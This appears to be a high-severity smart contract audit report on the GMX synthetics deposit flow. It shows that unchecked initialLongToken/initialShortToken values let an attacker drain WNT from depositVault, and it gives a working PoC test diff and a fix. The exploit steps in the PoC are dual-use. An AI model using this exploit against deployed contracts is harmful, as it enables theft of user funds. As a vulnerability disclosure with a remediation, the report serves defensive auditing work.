n33k

high

# WNT in depositVault can be drained by abusing initialLongToken/initialShortToken of CreateDepositParams

## Summary

The attacker can abuse the `initialLongToken`/`initialShortToken` of `CreateDepositParams` to drain all the WNT from depositVault.

## Vulnerability Detail

```solidity
    function createDeposit(
        DataStore dataStore,
        EventEmitter eventEmitter,
        DepositVault depositVault,
        address account,
        CreateDepositParams memory params
    ) external returns (bytes32) {
        Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);

        uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);
        uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);

        address wnt = TokenUtils.wnt(dataStore);

        if (market.longToken == wnt) {
            initialLongTokenAmount -= params.executionFee;
        } else if (market.shortToken == wnt) {
            initialShortTokenAmount -= params.executionFee;
```

The `initialLongToken` and `initialShortToken` of `CreateDepositParams` can be set to any token address and there is no check for the `initialLongToken` and `initialShortToken` during `createDeposit`. The attacker can set `initialLongToken`/`initialShortToken` to a token(USDC e.g.) with less value per unit than WNT and for a market with `market.longToken == wnt` or `market.shortToken == wnt`, `params.executionFee` will be wrongly subtracted from `initialLongTokenAmount` or `initialLongTokenAmount`. This allows the attacker to have a controllable large `params.executionFee` by sending tokens with less value. By calling `cancelDeposit`, `params.executionFee` amount of WNT will be repaid to the attacker.

Here is a PoC test case that drains WNT from depositVault:

```diff
diff --git a/gmx-synthetics/test/router/ExchangeRouter.ts b/gmx-synthetics/test/router/ExchangeRouter.ts
index 7eca238..c40a71c 100644
--- a/gmx-synthetics/test/router/ExchangeRouter.ts
+++ b/gmx-synthetics/test/router/ExchangeRouter.ts
@@ -103,6 +103,82 @@ describe("ExchangeRouter", () => {
     });
   });
 
+  it("createDepositPoC", async () => {
+    // simulate normal user deposit
+    await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));
+    await usdc.connect(user0).approve(router.address, expandDecimals(50 * 1000, 6));
+    const tx = await exchangeRouter.connect(user0).multicall(
+      [
+        exchangeRouter.interface.encodeFunctionData("sendWnt", [depositVault.address, expandDecimals(11, 18)]),
+        exchangeRouter.interface.encodeFunctionData("sendTokens", [
+          usdc.address,
+          depositVault.address,
+          expandDecimals(50 * 1000, 6),
+        ]),
+        exchangeRouter.interface.encodeFunctionData("createDeposit", [
+          {
+            receiver: user0.address,
+            callbackContract: user2.address,
+            market: ethUsdMarket.marketToken,
+            initialLongToken: ethUsdMarket.longToken,
+            initialShortToken: ethUsdMarket.shortToken,
+            longTokenSwapPath: [ethUsdMarket.marketToken, ethUsdSpotOnlyMarket.marketToken],
+            shortTokenSwapPath: [ethUsdSpotOnlyMarket.marketToken, ethUsdMarket.marketToken],
+            minMarketTokens: 100,
+            shouldUnwrapNativeToken: true,
+            executionFee,
+            callbackGasLimit: "200000",
+          },
+        ]),
+      ],
+      { value: expandDecimals(11, 18) }
+    );
+
+    // depositVault has WNT balance now
+    let vaultWNTBalance = await wnt.balanceOf(depositVault.address);
+    expect(vaultWNTBalance.eq(expandDecimals(11, 18)));
+
+    // user1 steal WNT from depositVault
+    await usdc.mint(user1.address, vaultWNTBalance.add(1));
+    await usdc.connect(user1).approve(router.address, vaultWNTBalance.add(1));
+
+    // Step 1. create deposit with malicious initialLongToken
+    await exchangeRouter.connect(user1).multicall(
+      [
+        exchangeRouter.interface.encodeFunctionData("sendTokens", [
+          usdc.address,
+          depositVault.address,
+          vaultWNTBalance.add(1),
+        ]),
+        exchangeRouter.interface.encodeFunctionData("createDeposit", [
+          {
+            receiver: user1.address,
+            callbackContract: user2.address,
+            market: ethUsdMarket.marketToken,
+            initialLongToken: usdc.address,       // use usdc instead of WNT
+            initialShortToken: ethUsdMarket.shortToken,
+            longTokenSwapPath: [],
+            shortTokenSwapPath: [],
+            minMarketTokens: 0,
+            shouldUnwrapNativeToken: true,
+            executionFee: vaultWNTBalance,
+            callbackGasLimit: "0",
+          },
+        ]),
+      ],
+    );
+
+    // Step 2. cancel deposit to drain WNT
+    const depositKeys = await getDepositKeys(dataStore, 0, 2);
+    // const deposit = await reader.getDeposit(dataStore.address, depositKeys[1]);
+    // console.log(deposit);
+    // console.log(depositKeys[1]);
+    await expect(exchangeRouter.connect(user1).cancelDeposit(depositKeys[1]));
+
+    // WNT is drained from depositVault
+    expect(await wnt.balanceOf(depositVault.address)).eq(0);
+  });
+
   it("createOrder", async () => {
     const referralCode = hashString("referralCode");
     await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));
```

## Impact

The malicious user can drain all WNT from depositVault.

## Code Snippet

https://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/deposit/DepositUtils.sol#L77-L80

## Tool used

Manual Review

## Recommendation

```diff
diff --git a/gmx-synthetics/contracts/deposit/DepositUtils.sol b/gmx-synthetics/contracts/deposit/DepositUtils.sol
index fae1b46..2811a6d 100644
--- a/gmx-synthetics/contracts/deposit/DepositUtils.sol
+++ b/gmx-synthetics/contracts/deposit/DepositUtils.sol
@@ -74,9 +74,9 @@ library DepositUtils {
 
         address wnt = TokenUtils.wnt(dataStore);
 
-        if (market.longToken == wnt) {
+        if (params.initialLongToken == wnt) {
             initialLongTokenAmount -= params.executionFee;
-        } else if (market.shortToken == wnt) {
+        } else if (params.initialShortToken == wnt) {
             initialShortTokenAmount -= params.executionFee;
         } else {
             uint256 wntAmount = depositVault.recordTransferIn(wnt);
```
